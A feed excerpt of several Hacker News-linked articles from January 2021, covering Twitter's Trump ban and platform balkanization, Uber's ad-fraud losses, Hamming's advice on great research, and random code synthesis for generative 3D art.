Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25689548">thread link</a>) | @generativist
<br/>
January 8, 2021 | https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful | <a href="https://web.archive.org/web/*/https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <figure><img src="https://p.falsifiable.page/zQmXh5PW9Q4DPPgcSpQZyX6MhBYUadFWQuZ4mtRN1E1m9Q7" alt=""></figure><h3 id="what-would-you-do">What Would You Do?</h3><p>Last November, I asked my followers a question,</p>
<div><blockquote><div lang="en" dir="ltr"><p>thought experiment: twitter has a dialog box that you have to fill out one day next year. if you press yes, trump and every interaction with him is irrevocably filtered from your feed. no, and they aren’t. </p><p>what do you press?</p></div>— (wannabe) Ƀreaker of (the Bad) Loops (@generativist) <a href="https://twitter.com/generativist/status/1326739583699095553?ref_src=twsrc%5Etfw">November 12, 2020</a></blockquote></div><p>Most answered in the affirmative. I would answer in the same way. No interaction with him – whether in favor or against – has ever been worth my time.<label for="sn-0"></label><span>I’ve never followed him but, FWIW, I have reply-guy’d in anger</span></p>
<p>That isn’t to say I want to simply ignore all references to him, period. That would be foolish. Not only was he the President of the United States, but he was a despotic megalomaniac. America is the country I call home, so it very much matters to me. Yelling “just ignore him” isn’t even a good solution for when two siblings fight in the back seat of your wood-paneled station wagon.</p>

<p>Yet, <strong>I am willing to rely on trusted mediation</strong>.</p>

<p>And, I have!</p>

<p>You probably have, too.</p>

<p>To a large degree, that is the generalized power and promise of social media.<label for="sn-1"></label><span>Of course, social media is not just also but is mostly an expressive medium. Thinking about it through a purely instrumental lens is an exercise of futility, at best.</span> “The real environment is altogether too big, too complex, and too fleeting for direct acquaintance.” We <em>require</em> indirect sources of information. Historically, such sources were bound by space and time. Technological progression slowly liberated us from both. Now, social media grants us the ability to select our intermediaries from what approaches the world’s entire population.<label for="sn-2"></label><span>The revolution wasn’t televised – it was topological. Or, something like that.</span> This power is truly incredible. We exist in a space our ancestors could only imagine through the magic of fiction.</p>

<p>However, with great power comes great potential fuckery.</p>
<p>Like ‘propaganda’, ‘manipulation’ currently has negative connotation. The more comfortable and consequently common word to reach for is “influence.” It amounts to the same thing though. When we say someone “influences” us, we mean we’ve escalated their permissions over our beliefs in some critical way. And as we extend trust, we constrict incredulity.</p>
<p>Ideally, this relationship isn’t paired with passivity. When someone’s expressions fail to match either our direct experience or our careful interrogation (or both), our trust in them <em>should</em> degrade. And, with degraded trust, our skepticism of what they have to say grows accordingly.</p>

<p><strong>This is an adaptive process.</strong> Human sociality affords distributed search and specialization. The titanic polymath who could deeply understand the entirety of human knowledge is a romanticized relic of a long departed past. Having the world’s information at your fingertips means that you can <em>enter</em> a mind-boggling large amount of the terrain at any given time. But, <em>you can’t explore it all</em>. Time still binds us individually. We need we.</p>
<p>This process becomes mal-adaptive in proportion to the degree that trust becomes a function of something <em>other</em> than our accumulated evaluations of what someone says.<label for="sn-3"></label><span>In political science literature, <a href="https://en.wikipedia.org/wiki/Negative_partisanship">negative partisanship</a> refers to one symptomatic manifestation of the syndrome.</span> As it does, the harms associated with the negative connotations of manipulation and propaganda manifest. We find both our emotions and beliefs manipulated in ways <em>at odds with what we would discover independently, given sufficient time and information.</em></p>

<p><a href="https://generativist.falsifiable.com/metaverse/dunbars-number-is-quadratic">On social media, this happens with fluid ease</a>.</p>

<p><a href="https://dispatches.artifexdeus.com/donald-trump-is-hari-seldon-75bd789637d9">Trump leverages this form of attack relentlessly</a>. Enjoying (pathological) agenda setting power in both traditional media and as social media supernode,<label for="sn-4"></label><span>I believe <a href="https://generativist.falsifiable.com/metaverse/the-real-supernode-problem">supernodes on social media represent a problem in their own right</a>.</span> his ability and inclination to induce mal-adaptive contagion is unrivaled in recent times.</p>
<p>For these reasons, I think Facebook and Twitter banning Trump is, at face-value, reasonable. <a href="https://medium.com/@generativist/dear-jack-ban-donald-trump-7c57e86c8ed9#.ee2bsxwu9">I also thought it was the correct thing to do in 2016</a>. It’s an emergency scram button to shut down our the hypercritical reactor. Banning Trump broadly facilitates the discovery and expression of beliefs for all participants – online and elsewhere – save Trump. <strong>However, I don’t think it’s reasonable to pretend doing so represents a <em>good</em> solution.</strong> Instead, it’s merely the best one constrained to those that are easy and without admitting the possibility of better architectures.</p>
<h2 id="a-decent-proposal">A Decent Proposal</h2><p>Trump’s grip on culture and social media strangles both. But only the latter affords straight-forward technological interventions. Individual action has proven insufficient. There are a myriad of incentives (many of which are also pathological) that prevent people from using mutes and blocks. It is a collective action problem for which the collective has no binding means of consensus formation. The question posed by my tweet allows me to propose a minimally viable one: <em>ask the users</em>.</p>

<p>To be more specific, consider a candidate specification:</p>

<blockquote>
<p>On <code>promptDate</code>, all users will be presented with a modal dialog asking them to make a <code>YES</code>/<code>NO</code> decision. If they answer <code>YES</code>, neither <code>@realdonaldtrump</code> nor any interaction with him gets placed in their feed. That is, twitter filters all of his tweets and replies from both your timeline feed and all user feeds (from the perspective of your account). If you answer <code>NO</code>, your subjective view does not change. The aggregate vote tallies are visible on each day up until <code>bindingDate</code>. You may change your vote any time until then. Afterwards, votes and resulting infrastructure changes are commited <em>and irrevocable for each particular account</em>.</p>
</blockquote>

<p>I think this solution would facilitate healthy conversation with effects that reverberated offline. Moreover, it does so in a way that expands the agency of twitter users, rather than unilateral restricts it.<label for="sn-5"></label><span>I’m only interested in twitter because I think it’s a far more important medium and because I think facebook and King Zuck are irredeemable.</span> However, neither hypothetical benefit motivates my reasoning.</p>
<h2 id="platform-balkanization">Platform Balkanization</h2><p>I’ve demanded the digital pound of metaphorical flesh many times. In the case of Donald Trump, I’d revel in it. That is to say, I understand viscerally the impulse towards participant expulsion, generally and in this particular.<label for="sn-6"></label><span>I no longer do, for a variety of reasons, many of which are in this post, but also <a href="https://twitter.com/generativist/status/1254475955478790144">at least in part because of interactions with twitter friends @sonyasupposedly and @aelkus</a>.</span> But Banning Trump is unique because it is possible that his move to, say Parler, <em>could</em> drive a mass exodus.<label for="sn-7"></label><span>I make no claims as to the odds.</span></p>

<p>The first order effects of such a potential outcome are delightful for many parties, including me. Twitter (and facebook), gets to discharge an asset-that-has-predictably-curdled-into-a-liability. There is a reason neither has acted until recently. And, Gab and Parler aren’t even competitors – they’re White knights. More importantly, those subject to durable social media abuses get genuine harm reduction. Dismissing that is just a smug variant on “fuck your feelings.”</p>

<p>But, reduction associated with displacing the shittiest participants of social media onto a new medium <em>could be an ephemeral mirage.</em> <strong>Out of sight, out of mind, <em>and into commercialized hate breeder reactors</em> may not be a good strategy</strong>. Thus, the risk I am more interested in at least injecting into the current frenetic conversation is platform balkanization.</p>
<p>Broadly, there are two hypotheses about what happens when these users get isolated on a new network partition (here, in the form of a different platform),</p>

<ol>
<li><p><strong>Smothered fire</strong>: The echo-chamber becomes a circle jerk; participants get bored for lack of targets; raids on larger networks will occur sporadically but they can’t trigger the same dynamics; the medium fizzles out.</p></li>

<li><p><strong>Coal-seam fire</strong>: The echo-chamber splits consensus reality in an enduring way; people with similar corrosive beliefs form an even more cohesive orthodoxy; the distance between them and people outside the partition grows; in-group trust pins on maximal, granting uncritical reception of escalatingly radical beliefs.</p></li>
</ol>

<p>The smothered fire scenario is seductive. And, it may happen! But, increasingly, the coal seam fire seems…if not more likely, than at least the one that deserves way more focused consideration. 2016 and everything after wasn’t a wildly unlikely bad sample path. It was a continuation. We hid some things from ourselves before then; we want to do so yet again. While criticisms of social media are extremely valid – there is an impressive inventory of problems – blame assignment then and now has some convenience borne of desperation. But, there is at least one critical difference: Public passions and fiduciary responsibilities are currently aligned.</p>
<h2 id="freedom-of-speech-vs-reach">Freedom of Speech vs Reach</h2><p>Censorship is easy to defend against at low temperatures. It’s our cultural’s default stance. But at high social temperatures where norms diffusely lose stability, so does the strength of our convictions. It becomes easier to withdraw principled support when principles no longer broadly bind.</p>

<p>Things are very hot now.</p>

<p>I have neither the desire nor inclination to defend Donald Trump on free speech grounds. I think people who do so are fools – those who do so in deference to a principle and with precisely zero context, doubly so.</p>

<p>I also think people who pretend it isn’t censorship – that it is a question of reach, rather than speech – miss the point in similar ways. Yes, Twitter is a private company. It has every legal right<label for="sn-8"></label><span>Section 230 questions aside.</span> to ban anyone, and especially someone as malignant as Trump. But, I treat it as something more important than that – I treat it as a public commons in hyper-space. Celebrating the corporate entities ability to unilateral tear up a large portion of the social graph makes the contrast obvious. In it, I find myself in a curious position: imploring Lord Jack to consider better …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful">https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful</a></em></p>]]>
            </description>
            <link>https://generativist.falsifiable.com/metaverse/centralized-social-partitions-considered-harmful</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689548</guid>
            <pubDate>Fri, 08 Jan 2021 19:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How did Uber waste so much ad money?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25689412">thread link</a>) | @mektrik
<br/>
January 8, 2021 | https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money | <a href="https://web.archive.org/web/*/https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Uber's ad troubles aren't recent news. As early as the start of 2020, there were stories coming out about how they'd realised they'd wasted huge multi-million dollar budgets on fraudulent ads.</p><p>For some reason, these stories only received limited attention at the time, and mostly just from within the marketing community. At the start of 2021 however <a href="https://twitter.com/nandoodles/status/1345774768746852353">they re-emerged</a>, and with that brought a whole new wave of people asking: <em>how did Uber waste that much ad spend?</em></p><figure id="w-node-5a52e94b4c30-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af6b2e435e23d4fe5a75_Untitled.png" alt=""></p></figure><h2>What did Uber waste their budgets on?</h2><p>Uber wasted a significant proportion of their budgets that were spent on 3rd party advertising networks, sometimes referred to as <em>programmatic</em> advertising.</p><p>A 3rd party network allows advertisers to buy ad inventory on all sorts of websites and apps, that aren't affiliated with the network itself. An example of such a network that many are familiar with is Google AdSense. AdSense facilitates the buying of ads on a range of non-Google properties, even though it's owned and managed by Google.</p><p>3rd party networks contrast with more standard platforms like Facebook Ads, or Google Ads. Each of these platforms allows advertisers to buy ad space on properties that belong to the ad network (i.e. Facebook or Google).</p><p>This question of ownership, of who owns the property that the advertiser is buying ads on, will become important in understanding how ad fraud occurs.</p><h2>What is ad fraud?</h2><p><em>Ad fraud</em> is a collective term for a number of practices that attempt to fraudulently take advertising budgets from advertisers.</p><h3>Basic ad fraud</h3><p>A classic example of ad fraud is to sell fake impressions, where <em>impression</em> is advertiser-speak for an ad view. If you're running a website where you sell space via a 3rd party network, it might cross your mind that you could boost your ad revenues by generating fake impressions on your site. For example, by having bots visit your site and causing ads to load, thus generating incremental ad revenue for you.</p><p>This is a fairly simplistic form of ad fraud, and one that's relatively easy to detect. Common markers are high volumes of traffic coming from a certain IP, with certain browser characteristics (user-agents, screen sizes etc.).</p><p>Even when it's not detected though, it only really harms one sort of advertiser; an advertiser who is optimising to get the most impressions (or reach) possible for their budget.</p><p>If an advertiser isn't just concerned with impressions, but they also want to see people clicking on their ads, or going on to download their app after clicking on their ads (á la Uber) then in theory they're less likely to fall victim to ad fraud.</p><p>This is because the advertiser will either manually notice that traffic from the fraudulent site isn't converting how they want it to, or because they're running optimisation algorithms which'll shift spend away from that site when they notice its users aren't converting.</p><h3>Sophisticated ad fraud</h3><p>Unfortunately though, checking whether users who come through your ads end up downloading wasn't enough to save Uber.</p><p>As Kevin Frisch (Uber's ex-head of performance marketing and CRM) notes, they found cases where a user would click on an ad and be signed into Uber 2 seconds later. This is of course practically impossible, and suggests that these sites were using bots which could create and interact with Uber accounts to make it appear as if genuine users were coming from those sites.</p><p>This would in turn convince whichever marketing manager or algorithm that was monitoring Uber's spend to shift more budget to those sites, because they appeared to be generating real user interactions.</p><p>All of this wins the fraudulent sites more and more of Uber's ad spend, all the while leading to no actual revenue or upside for Uber.</p><h3>Countering ad fraud</h3><p>One way to counter ad fraud is to use revenue-driving events to determine how you spend your budget.</p><p>What I mean by this, in Uber's case, would be looking at how the different sites you placed ads on fared when it came to generating revenue-driving events, like rides booked. If a site brings you lots of new users, who all start booking rides with Uber, then there's likely little (if any) fraud on the site.</p><figure id="w-node-b60859aeb077-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af7379a88562953682b1_Untitled.png" alt=""></p></figure><p>Fraudsters can't spoof this by creating bots which visit their site, download Uber, and start paying for rides. Well, they can, except the amount they spend on rides would have to exceed the ad revenue that their site is generating in order for Uber to want to continue advertising on that site.</p><p>So in this sense, optimising your ad delivery based on revenue-driving events greatly diminishes the chance of falling victim to ad fraud.</p><h3>Why didn't Uber do this?</h3><p>There are a couple of reasons why Uber may not have done this. One is that display advertising, which is where the fraud occurred, is what advertisers call <em>upper-funnel</em> marketing.</p><p>Upper-funnel marketing is good for driving awareness, and brand recognition, and maybe even installs. That said, upper-funnel marketing is generally less good at driving revenue in a short timeframe.</p><p>As such, Uber may have decided that they were going to optimise their display advertising solely based on installs, and not a lower-funnel action like rides booked, because they didn't expect to get much data for the latter.</p><figure id="w-node-f19409766f0e-192f161b"><p><img src="https://uploads-ssl.webflow.com/5e26e90f16b6d177e3ff36c6/5ff8af80e17726a106141537_Untitled.png" alt=""></p></figure><p>Uber may have effectively assumed that the percentage conversion rate from install to ride booked on these fraudulent display channels would be the same as on non-fraudulent channels, and so believed that they were getting a good deal if they could drive installs on a fraudulent channel at the same cost per install as a non-fraudulent channel. Of course if installs from a fraudulent channel never converted to rides booked (i.e. revenue), then this isn't an effective assumption.</p><h2>Cutting the fat</h2><p>The other thing Kevin Frisch said which I found interesting was:</p><ul role="list"><li><em>We turned off two thirds of our ad spend – $100m out of annual spend of $150m – and basically saw no change in our number of rider app installs. What we saw is a lot of installs we thought had come through paid channels suddenly came through organic.</em></li></ul><p>Straight off the bat it's interesting to note that total install volume stayed constant, while install source shifted in favour of organic. This naturally suggests that paid channels were over-attributing; marketing-speak for taking credit for installs that they didn't actually generate.</p><p>The other interesting thing is the suggestion of measuring the efficacy of paid channels by just turning them off.</p><h3>Measurement and timeframes</h3><p>If you're running paid channels where you expect a low latency between ad impression and conversion, then this is a perfectly valid way to measure the effectiveness of those channels. A great example of this sort of channel would be paid search; if you turn paid search off then (if it's being run well) you should expect conversion numbers to fall almost immediately.</p><p>The channels that Uber were running appear to be quite different to the paid search example; they appear to be primarily display and branding channels. Because brand-focused ads work over a much longer timeframe, be it months or years, you can't expect to see an immediate decrease in conversion volume when they're turned off.</p><p>If the conversion volume stays high, this could be because of the cumulative effect of all previous ads run. It might be that these ads built such a strong brand for Uber over such a long period of time, that Uber's conversion volume could keep growing organically even after the ads were turned off.</p><p>What this really all hinges on is how long Uber waited after turning off the ads before determining that there was &nbsp;<em>"no change in our number of rider app installs"</em>. I would assume Uber were smart enough to wait a good period of time (at least 6 months) before determining this. If Uber simply waited a month, that may well not have been long enough to determine the long term impact of pulling ad spend.</p><h3>Marginal cost per install</h3><p>The other point it's worth considering is that Frisch says Uber <em>basically saw no change in [Uber's] number of rider app installs</em>. The <em>basically</em> implies that there was likely some change, albeit a very insignificant change in comparison to the reduction in spend.</p><p>What's worth noting here is that you don't have to be buying dodgy ads to notice this sort of behaviour, where a huge drop in spend has nearly no impact on volume. The reason for this is that many advertisers unknowingly have incredibly high marginal efficiency metrics, such as marginal cost per install in Uber's case.</p><p>This comes about because you're saturating a market so heavily that, while the cost of 90% of your installs might be low, the cost of getting those last 10% is incredibly high. The cost to get one additional install is your <em>marginal cost per install</em>, and it's a metric few advertisers know how to track.</p><p>Because advertisers don't typically focus on marginal efficiency metrics, they can often grow to extraordinary values, to the point where a marginal cost per install could be 10x a brand's average cost per install. Advertisers in this position can stand to save huge amounts of ad spend, whilst only losing a small amount of volume, just by pulling back their budgets.</p><p>I have no proof whatsoever that this was a determining factor in what Uber noticed, but I'd wager it likely played some part. It's hard to imagine that a brand like Uber, spending $150 million a year, didn't have sky-high marginal costs per install.</p><h2>In summary</h2><p>Uber wasted a whole bunch of cash. This primarily came because of ad fraud, and the fact that Uber likely weren't monitoring their revenue-driving events closely enough to notice that some (fraudulent) sites weren't driving these events.</p><p>Uber's approach of just turning off 2/3rds of their spend is a good way to understand it's impact, but only if you wait long enough to really see the impact of that reduced spend. Uber likely also benefitted from pulling back because their marginal efficiency metrics were so high.</p><p>‍</p></div></div></div>]]>
            </description>
            <link>https://mackgrenfell.com/blog/how-did-uber-waste-so-much-ad-money</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689412</guid>
            <pubDate>Fri, 08 Jan 2021 19:51:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Control Teleport Robot]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25689258">thread link</a>) | @tomjacobs
<br/>
January 8, 2021 | http://teleportconnect.com/teleport.html | <a href="https://web.archive.org/web/*/http://teleportconnect.com/teleport.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

  <div>

    <center>
    <a href="http://teleportconnect.com/"><img src="http://teleportconnect.com/img/teleport_logo.png"></a>
    &nbsp;<a href="http://teleportconnect.com/">About</a> | 
    &nbsp;<a href="https://www.tindie.com/products/teleport/teleport">Buy a Teleport</a>
    </center>

    <div>

      <!-- Asleep? -->
      

      <div>

        <!-- Video canvas -->
        
        

      </div>

      <div>
       

    <!-- List of tracks -->
    
    <br>

    <!-- List of devices online -->
    
    

    </div>

    </div>

    

    

    

</div></div>]]>
            </description>
            <link>http://teleportconnect.com/teleport.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689258</guid>
            <pubDate>Fri, 08 Jan 2021 19:39:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Stroke of Genius: Striving for Greatness in All You Do]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25689250">thread link</a>) | @Tomte
<br/>
January 8, 2021 | http://www.mccurley.org/advice/hamming_advice.html | <a href="https://web.archive.org/web/*/http://www.mccurley.org/advice/hamming_advice.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><hr size="3" noshade="">  
  
<h3>  
<center>  
A Stroke of Genius: Striving for Greatness in All You Do
<h4>by R. W. Hamming</h4>  
  
  
</center>  
</h3>  
  
<hr size="3" noshade=""> 
  
  
<p>Little has been written on managing your own research (and very little  
on avoiding other people managing your research); however, your research  
is much more under your control than you may realize. </p>  
  
<p>We are concerned with great research here. Work that will get wide recognition,  
perhaps even wine Nobel Prize. As most people realize, the average published  
paper is read by the author, the referee, and perhaps one other person.  
Classic papers are read by thousands. We are concerned with research that  
will matter in the long run and become more than a footnote in history.  
</p>  
  
<p>If you are to do important work then you must work on the right problem  
at the right time and in the right way. Without any one of the three, you  
may do good work but you will almost certainly miss real greatness. </p>  
  
<p>Greatness is a matter of style. For example, after learning the elements  
of painting, you study under a master. While studying you pay attention  
to what the master says in discussing your work, but you know that if you  
are to achieve greatness then you must find your own style. Furthermore,  
a successful style in one age is not necessarily appropriate for another  
age. Cubism would not have gone over big during the realism period. </p>  
  
<p>Similarly, there is no simple formula for doing great science or engineering,  
I can only talk around the topic. The topic is important because, so far  
as we have any solid evidence, you have but one life to live. Under these  
circumstances it seems better to live a life in which you do important  
things (important in your eyes, of course) than to merely live out your  
life. No sense frittering away your life on things that will not even appear  
in the footnotes. </p>  
  
<u><h4>choosing the problem </h4>  </u>

<p>I begin with the choice of problem. Most scientists spend almost all  
of their time working on problems that even they admit are neither great  
or are likely to lead to great work; hence, almost surely, they will not  
do important work. Note that importance of the results of a solution does  
not make the problem important. In all the 30 years I spent at Bell Telephone  
Laboratories (before it was broken up) no one to my knowledge worked on  
time travel, teleportation, or anti-gravity. Why? Because they had no attack  
on the problem. Thus an important aspect of any problem is that you have  
a good attack, a good starting place, some reasonable idea of how to begin.  
</p>  
  
<p>To illustrate, consider my experience at BTL. For the first few years  
I ate lunch with he mathematicians. I soon found that they were more interested  
in fun and games than in serious work, so I shifted to eating with the  
physics table. There I stayed for a number of years until the Nobel Prize,  
promotions, and offers from other companies, removed most of the interesting  
people. So I shifted to the corresponding chemistry table where I had a  
friend. </p>  
  
<p>At first I asked what were the important problems in chemistry, then  
what important problems they were working on, or problems that might lead  
to important results. One day I asked, "if what they were working  
on was not important, and was not likely to lead to important things, they  
why were they working on them?" After that I had to eat with the engineers!  
</p>  
  
<p>About four months later, my friend stopped me in the hall and remarked  
that my question had bothered him. He had spent the summer thinking about  
the important problems in his area, and while had had not changed his research  
he thought it was well worth the effort. I thanked him and kept walking.  
A few weeks later I noticed that he was made head of the department. Many  
years later he became a member of the National Academy of Engineering.  
The one person who could hear the question went on to do important things  
and all the others -- so far as I know -- did not do anything worth public  
attention. </p>  
  
<p>There are many right problems, but very few people search carefully  
for them. Rather they simply drift along doing what comes to them, following  
the easiest path to tomorrow. Great scientists all spend a lot of time  
and effort in examining the important problems in their field. Many have  
a list of 10 to 20 problems that might be important if they had a decent  
attack. As a result, when they notice something new that they had not known  
but seems to be relevant, then they are prepared to turn to the corresponding  
problem, work on it, and get there first. </p>  
  
<p>Some people work with their doors open in clear view of those who pass  
by, while others carefully protect themselves from interruptions. Those  
with the door open get less work done each day, but those with their door  
closed tend not know what to work on, nor are they apt to hear the clues  
to the missing piece to one of their "list" problems. I cannot  
prove that the open door produces the open mind, or the other way around.  
I only can observe the correlation. I suspect that each reinforces the  
other, that an open door will more likely lead you and important problems  
than will a closed door. </p>  
  
<p>Hard work is a trait that most great scientists have. Edison said that  
genius was 99% perspiration and 1% inspiration. Newton said that if others  
would work as hard as he did then they would get similar results. Hard  
work is necessary but it is not sufficient. Most people do not work as  
hard as they easily could. However, many who do work hard -- work on the  
wrong problem, at the wrong time, in the wrong way, and have very little  
to show for it. </p>  
  
<p>You are aware that frequently more than one person starts working on  
the same problem at about the same time. In biology, both Darwin and Wallace  
had the idea of evolution at about the same time. In the area of special  
relativity, many people besides Einstein were working on it, including  
Poincare. However, Einstein worked on the idea in the right way. </p>  
  
<p>The first person to produce definitive results generally gets all the  
credit. Those who come in second are soon forgotten. Thus working on the  
problem at the right time is essential. Einstein tried to find a unified  
theory, spent most of his later life on it, and died in a hospital still  
working on it with no significant results. Apparently, he attacked the  
problem too early, or perhaps it was the wrong problem. </p>  
  
<p>There are a pair of errors that are often made when working on what  
you think is the right problem at the right time. One is to give up too  
soon, and the other is to persist and never get any results. The second  
is quite common. Obviously, if you start on a wrong problem and refuse  
to give up, you are automatically condemned to waste the rest of your life  
(see Einstein above). Knowing when you persist is not easy -- if you are  
wrong then you are stubborn; but if you turn out to be right, then you  
are strong willed. </p>  
  
<p>I now turn to the major excuse given for not working on important problems.  
People are always claiming that success is a matter of luck, but as Pasteur  
pointed out, "Luck favors the prepared mind." </p>  
  
<p>A great deal of direct experience, vicarious experience through questioning  
others, and reading extensively, convinces me of the truth of his statement.  
Outstanding successes are too often done by the same people for it be a  
matter of random chance. </p>  
  
<p>For example, when I first met Feynmann at Los Alamos during the WWII,  
I believed that he would get a Nobel Prize. His energy, his style, his  
abilities, all indicated that he was a person who would do many things,  
and probably at least one would be important. Einstein, around the age  
of 12 or 14, asked himself what a light wave would look like if he want  
at the speed of light. He knew that Maxwell's theory did not support a  
local, stationary maximum, but was what he ought to see if the current  
theory was correct. So it is not surprising that he later developed the  
special theory of relativity - he had prepared his mind for it long before.  
</p>  
  
<p>Many times a discussion with a person who has just done something important  
will produce a description of how they were led, almost step by step, to  
the result. It is usually based on things they had done, or intensely thought  
about, years ago. You succeed because you have prepared yourself with the  
necessary background long ago, without, of course, knowing then that it  
would prove to be a necessary step to success. </p>  
  
  
<u><h4>Personal traits </h4></u>  
  
<p>There traits are not all essential, but tend to be present in most doers  
of great things in science. First, successful people exhibit more activity,  
more energy, than most people do. They look more places, they work harder,  
they think longer than less successful people. Knowledge and ability are  
much like compound interest -- the more you do the more you can do, and  
the more the opportunities are open for you. Thus, among other things,  
it was Feynmann's energy and his constantly trying new things that made  
one think he would succeed. </p>  
  
<p>This trait must be coupled with emotional commitment. Perhaps the ablest  
mathematician I have watched up close seldom, if ever, seemed to care deeply  
about the problem he was working on. He has done great deal of first class  
work, but not of the highest quality. Deep emotional commitment seems to  
be necessary for success. The reason is obvious. The emotional commitment  
keeps you thinking about the problem morning, noon and night, and that  
tends to beat out mere ability. </p>  
  
<p>While I was at Los Alamos after the war, I got to thinking about the  
famous Buffon needle problem where you can calculate the probability of  
a needle tossed at random of crossing one of a series of equally spaced  
parallel lines. I asked myself if it was essential that the needle be …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.mccurley.org/advice/hamming_advice.html">http://www.mccurley.org/advice/hamming_advice.html</a></em></p>]]>
            </description>
            <link>http://www.mccurley.org/advice/hamming_advice.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25689250</guid>
            <pubDate>Fri, 08 Jan 2021 19:39:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creative Code Synthesis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25689150">thread link</a>) | @coolvision
<br/>
January 8, 2021 | https://grgv.xyz/creative_code_synthesis/ | <a href="https://web.archive.org/web/*/https://grgv.xyz/creative_code_synthesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Creative coding is a discipline of using programming as an artistic tool. <a href="https://thegradient.pub/the-past-present-and-future-of-ai-art/">It has a rich history</a>, and it's becoming more widespread and accessible, based on many mature frameworks for multimedia applications, and great support for creative applications in modern web browsers. <em>Algorithmic art</em> and <em>generative art</em> are related terms that roughly mean the same thing.</p>
<p>There are <a href="#examples" id="ref1">many examples</a> of amazing artworks that are generated with algorithms. This project, however, is not about writing image-generating programs. It's about meta-programming, that is, automatic generation of programs that in turn produce creative visuals.</p>

<p>
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_55.png">
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_63.png">
</p>
<h3>Program synthesis</h3>
<p>While working on <a href="https://grgv.xyz/inductive_program_synthesis/">inductive program synthesis project</a>, I learned about automatic generation of code that satisfies input-output examples for tasks like "reverse an array".</p>
<p>Similar approach can be used for a more creative application. The idea is to base generated code on a graphics framework (for example Three.js), and to generate instructions randomly. When evaluated, generated programs should create interesting 3d scenes and images.</p>
<p>Of course, majority of randomly generated programs would not even draw anything (after all, programming is not that simple). But it's easy to just apply brute force search, and to continue trying until one of the programs actually renders something.</p>

<p>
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_52.png">
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_56.png">
</p>
<h3>Implementation &amp; demo</h3>
<p>For technical details, I can refer to the <a href="https://grgv.xyz/inductive_program_synthesis/">post about program synthesis</a>. In brief, programs are represented as JSON structures, which are populated from a predefined set of statements and functions. Then JSON is converted to Javascript with a simple code generator, and evaluated.</p>
<p>Often, generated images contain just one or two random primitive objects, which is not very interesting, so I'm additionally filtering out programs that render images with less than 10 objects.</p>
<p>The demo on top of this page is simple: press "generate" and wait for few seconds until the next program is generated. There are several pre-loaded images/programs, which can be selected with a click for viewing in the larger viewport. Programs are saved to to browser localStorage. Favourite images can be marked with <span>"★ save"</span> buttons, and boring images can be deleted with "Delete unsaved" button.</p>

<p>
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/img_10.png">
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_10.png">
</p>
<h3>Automatic creativity?</h3>
<p>Most generated images are trivial and boring. However, with a human curator filtering out simple and repetitive images, it does produce interesting results, and the sheer variety of the created images is impressive.</p>
<p>Of course, results are not as good as algorithmic artworks designed by people, but it still might be a good source of inspiration, and some of the images might even deserve to be on posters.</p>


<!-- <div class="flex flex-wrap justify-around">
	<img class="w-20"
		src="/creative_code_synthesis/3d_images_selected/mediamodifier_image.png" />
</div> -->

<p>
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_61.png">
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_62.png">
</p>
<h3>Comparison with existing systems</h3>
<p>There are several similar systems that apply some form of code/parameter generation to interactive computational creativity. Some exampls: <a href="https://electricsheep.org/#/sheep">electricsheep.org</a>, <a href="https://grgv.xyz/creative_code_synthesis/tinkersynth.com">tinkersynth.com</a>, <a href="http://hexagonal.surge.sh/">hexagonal.surge.sh</a>, <a href="https://www.joelsimon.net/corals.html">joelsimon.net/corals.html</a>, and few other can be found at <a href="https://mlart.co/">mlart.co</a>.</p>
<p>But all of the systems that I know of are based on some specialized environments and parametrizations. The main difference of this project is that code generation is done with a general purpose programming language (and a popular one). This way, creative metaprogramming is easier to extend, code is easier to examine, it can be demonstrated in any modern browser, and does not require additional setup.</p>

<p>
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/img_23.png">
	<img src="https://grgv.xyz/creative_code_synthesis/3d_images_selected/download_42.png">
</p>
<h2>Links</h2>
<p>A collection of resources that were useful for learning about creative coding and artificial creativity.</p>
<h3>Creative coding &amp; generative art overview</h3>
